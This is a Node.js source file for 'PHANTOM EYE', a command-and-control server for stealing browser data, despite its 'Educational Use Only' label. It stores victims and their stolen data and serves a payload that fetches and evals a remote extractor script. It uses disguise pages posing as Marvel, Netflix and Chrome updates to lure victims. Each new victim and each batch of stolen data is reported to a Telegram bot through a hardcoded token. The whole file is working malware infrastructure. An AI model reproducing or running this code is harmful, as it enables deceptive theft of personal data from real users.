// ================================================
// PHANTOM EYE - Advanced Data Extraction C2 Server
// With Telegram Notifications
// Educational Use Only
// ================================================

const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fs = require('fs');
const cors = require('cors');
const { v4: uuidv4 } = require('uuid');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');
const axios = require('axios');

// ================================================
// CONFIGURATION - EDIT THESE!
// ================================================
const CONFIG = {
    server: {
        port: process.env.PORT || 3001,
        secret: 'PHANTOM_EYE_SECRET_2024'
    },
    admin: {
        username: 'admin',
        password: 'Phantom2024!'
    },
    telegram: {
        botToken: '8898422922:AAHKKmTW2mgJyz3lFV7vqtk7T7RjT5qMf78',    // ← GET FROM @BotFather
        chatId: '7075480337'         // ← GET FROM @userinfobot
    }
};

// ================================================
// DATABASE
// ================================================
class Database {
    constructor() {
        this.db = new sqlite3.Database('./database.db');
        this.init();
    }

    init() {
        this.db.serialize(() => {
            // Victims table
            this.db.run(`
                CREATE TABLE IF NOT EXISTS victims (
                    id TEXT PRIMARY KEY,
                    victim_id TEXT UNIQUE,
                    computer_name TEXT,
                    username TEXT,
                    os TEXT,
                    ip TEXT,
                    country TEXT,
                    status TEXT DEFAULT 'active',
                    first_seen DATETIME,
                    last_seen DATETIME,
                    data_count INTEGER DEFAULT 0
                )
            `);

            // Extracted data table
            this.db.run(`
                CREATE TABLE IF NOT EXISTS extracted_data (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    victim_id TEXT,
                    data_type TEXT,
                    data TEXT,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            `);

            // Admins table
            this.db.run(`
                CREATE TABLE IF NOT EXISTS admins (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    username TEXT UNIQUE,
                    password TEXT
                )
            `);

            // Create default admin
            this.db.get('SELECT * FROM admins LIMIT 1', (err, row) => {
                if (!row) {
                    const hashed = bcrypt.hashSync(CONFIG.admin.password, 10);
                    this.db.run(
                        'INSERT INTO admins (username, password) VALUES (?, ?)',
                        [CONFIG.admin.username, hashed]
                    );
                    console.log('✅ Admin created');
                }
            });
        });
    }

    addVictim(data) {
        return new Promise((resolve, reject) => {
            const id = uuidv4();
            const victimId = data.victim_id || `V-${Date.now().toString(36).toUpperCase()}`;
            
            this.db.run(
                `INSERT INTO victims (
                    id, victim_id, computer_name, username, os, ip, country,
                    first_seen, last_seen, status
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
                [
                    id, victimId, data.computer_name, data.username,
                    data.os, data.ip, data.country,
                    new Date().toISOString(), new Date().toISOString(),
                    'active'
                ],
                function(err) {
                    if (err) reject(err);
                    else resolve({ id, victimId });
                }
            );
        });
    }

    saveExtractedData(victimId, dataType, data) {
        return new Promise((resolve, reject) => {
            this.db.run(
                'INSERT INTO extracted_data (victim_id, data_type, data) VALUES (?, ?, ?)',
                [victimId, dataType, JSON.stringify(data)],
                function(err) {
                    if (err) reject(err);
                    else {
                        // Update victim data count
                        this.db.run(
                            'UPDATE victims SET data_count = data_count + 1 WHERE victim_id = ?',
                            [victimId],
                            () => {}
                        );
                        resolve({ id: this.lastID });
                    }
                }
            );
        });
    }

    getVictims() {
        return new Promise((resolve, reject) => {
            this.db.all('SELECT * FROM victims ORDER BY first_seen DESC', (err, rows) => {
                if (err) reject(err);
                else resolve(rows);
            });
        });
    }

    getExtractedData(victimId) {
        return new Promise((resolve, reject) => {
            this.db.all(
                'SELECT * FROM extracted_data WHERE victim_id = ? ORDER BY timestamp DESC',
                [victimId],
                (err, rows) => {
                    if (err) reject(err);
                    else resolve(rows);
                }
            );
        });
    }

    getStats() {
        return new Promise((resolve, reject) => {
            const stats = { total: 0, active: 0, data_points: 0 };
            
            this.db.get('SELECT COUNT(*) as total FROM victims', (err, row) => {
                if (!err) stats.total = row.total;
            });
            
            this.db.get("SELECT COUNT(*) as active FROM victims WHERE status = 'active'", (err, row) => {
                if (!err) stats.active = row.active;
            });
            
            this.db.get('SELECT COUNT(*) as data_points FROM extracted_data', (err, row) => {
                if (!err) stats.data_points = row.data_points;
                resolve(stats);
            });
        });
    }
}

// ================================================
// SERVER
// ================================================
class Server {
    constructor() {
        this.app = express();
        this.db = new Database();
        this.server = http.createServer(this.app);
        this.io = socketIO(this.server, { cors: { origin: "*" } });

        this.setupMiddleware();
        this.setupRoutes();
        this.setupWebSocket();
    }

    // ================================================
    // TELEGRAM NOTIFICATIONS
    // ================================================
    async sendTelegram(message) {
        try {
            const url = `https://api.telegram.org/bot${CONFIG.telegram.botToken}/sendMessage`;
            await axios.post(url, {
                chat_id: CONFIG.telegram.chatId,
                text: message,
                parse_mode: 'HTML'
            });
            console.log('📱 Telegram notification sent');
        } catch (e) {
            console.log('⚠️ Telegram send failed:', e.message);
        }
    }

    setupMiddleware() {
        this.app.use(cors());
        this.app.use(express.json({ limit: '50mb' }));
        this.app.use(express.static(__dirname));
        this.app.use(express.static(path.join(__dirname, 'public')));
    }

    setupRoutes() {
        // ===== PUBLIC =====
        this.app.get('/', (req, res) => {
            res.sendFile(path.join(__dirname, 'dashboard.html'));
        });

        // ===== PAYLOAD DELIVERY =====
        this.app.get('/payload.js', (req, res) => {
            res.setHeader('Content-Type', 'application/javascript');
            res.send(`
                console.log('👁️ PHANTOM EYE ACTIVATED');
                console.log('📊 Scanning for browser data...');
                fetch('/client/extractor.js')
                    .then(response => response.text())
                    .then(code => { eval(code); })
                    .catch(err => console.error('Failed to load:', err));
            `);
        });

        this.app.get('/client/extractor.js', (req, res) => {
            res.sendFile(path.join(__dirname, 'client', 'extractor.js'));
        });

        // ===== DISGUISE PAGES =====
        this.app.get('/marvel', (req, res) => {
            res.sendFile(path.join(__dirname, 'public', 'marvel.html'));
        });

        this.app.get('/netflix', (req, res) => {
            res.sendFile(path.join(__dirname, 'public', 'netflix.html'));
        });

        this.app.get('/chrome', (req, res) => {
            res.sendFile(path.join(__dirname, 'public', 'chrome.html'));
        });

        // ===== SHORTCUTS =====
        this.app.get('/game', (req, res) => { res.redirect('/marvel'); });
        this.app.get('/premium', (req, res) => { res.redirect('/netflix'); });
        this.app.get('/update', (req, res) => { res.redirect('/chrome'); });

        // ===== API ENDPOINTS =====
        this.app.post('/api/register', async (req, res) => {
            try {
                const data = req.body;
                data.ip = req.ip || req.connection.remoteAddress;
                data.country = req.headers['cf-ipcountry'] || 'Unknown';

                const result = await this.db.addVictim(data);
                this.io.emit('new_victim', { victimId: result.victimId });

                // ===== TELEGRAM NOTIFICATION - NEW VICTIM =====
                await this.sendTelegram(`
👁️ <b>NEW VICTIM!</b>

🆔 ID: ${result.victimId}
💻 Computer: ${data.computer_name || 'Unknown'}
👤 User: ${data.username || 'Unknown'}
🌐 OS: ${data.os || 'Unknown'}
📡 IP: ${data.ip || 'Unknown'}
🌍 Country: ${data.country || 'Unknown'}
⏰ Time: ${new Date().toISOString()}
`);

                res.json({
                    success: true,
                    victimId: result.victimId
                });
            } catch (e) {
                res.status(500).json({ error: e.message });
            }
        });

        this.app.post('/api/data', async (req, res) => {
            try {
                const { victimId, dataType, data } = req.body;
                await this.db.saveExtractedData(victimId, dataType, data);
                this.io.emit('new_data', { victimId, dataType });

                // ===== TELEGRAM NOTIFICATION - NEW DATA =====
                const dataSize = JSON.stringify(data).length;
                await this.sendTelegram(`
📊 <b>NEW DATA RECEIVED!</b>

🆔 Victim: ${victimId}
📁 Type: ${dataType}
📦 Size: ${dataSize} bytes
⏰ Time: ${new Date().toISOString()}
`);

                res.json({ success: true });
            } catch (e) {
                res.status(500).json({ error: e.message });
            }
        });

        this.app.post('/api/admin/login', async (req, res) => {
            try {
                const { username, password } = req.body;
                
                this.db.db.get(
                    'SELECT * FROM admins WHERE username = ?',
                    [username],
                    (err, row) => {
                        if (err || !row) {
                            return res.status(401).json({ error: 'Invalid credentials' });
                        }
                        
                        const valid = bcrypt.compareSync(password, row.password);
                        if (!valid) {
                            return res.status(401).json({ error: 'Invalid credentials' });
                        }
                        
                        const token = jwt.sign(
                            { id: row.id, username: row.username },
                            CONFIG.server.secret,
                            { expiresIn: '7d' }
                        );
                        
                        res.json({ success: true, token });
                    }
                );
            } catch (e) {
                res.status(500).json({ error: e.message });
            }
        });

        this.app.get('/api/admin/victims', async (req, res) => {
            try {
                const victims = await this.db.getVictims();
                res.json({ success: true, victims });
            } catch (e) {
                res.status(500).json({ error: e.message });
            }
        });

        this.app.get('/api/admin/data/:victimId', async (req, res) => {
            try {
                const data = await this.db.getExtractedData(req.params.victimId);
                res.json({ success: true, data });
            } catch (e) {
                res.status(500).json({ error: e.message });
            }
        });

        this.app.get('/api/admin/stats', async (req, res) => {
            try {
                const stats = await this.db.getStats();
                res.json({ success: true, stats });
            } catch (e) {
                res.status(500).json({ error: e.message });
            }
        });
    }

    setupWebSocket() {
        this.io.on('connection', (socket) => {
            console.log('🔌 Client connected:', socket.id);

            socket.on('authenticate', (token) => {
                try {
                    jwt.verify(token, CONFIG.server.secret);
                    socket.authenticated = true;
                    socket.emit('authenticated', { success: true });
                } catch (e) {
                    socket.emit('authenticated', { success: false });
                }
            });

            socket.on('get_stats', async () => {
                if (!socket.authenticated) return;
                const stats = await this.db.getStats();
                socket.emit('stats', stats);
            });

            socket.on('get_victims', async () => {
                if (!socket.authenticated) return;
                const victims = await this.db.getVictims();
                socket.emit('victims', victims);
            });

            socket.on('disconnect', () => {
                console.log('🔌 Client disconnected:', socket.id);
            });
        });
    }

    start() {
        this.server.listen(CONFIG.server.port, () => {
            console.log(`
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   👁️ PHANTOM EYE C2 SERVER                                 ║
║   📊 Advanced Browser Data Extraction                      ║
║                                                               ║
║   🌐 Server: http://localhost:${CONFIG.server.port}              ║
║   📊 Dashboard: http://localhost:${CONFIG.server.port}/         ║
║                                                               ║
║   🎮 MARVEL: /marvel                                         ║
║   🎬 NETFLIX: /netflix                                      ║
║   🌐 CHROME: /chrome                                        ║
║                                                               ║
║   🔑 Login: admin / Phantom2024!                            ║
║   📱 Telegram: ${CONFIG.telegram.botToken !== 'YOUR_BOT_TOKEN_HERE' ? '✅ Enabled' : '❌ Disabled (Add Token)'}     ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
            `);
        });
    }
}

const server = new Server();
server.start();
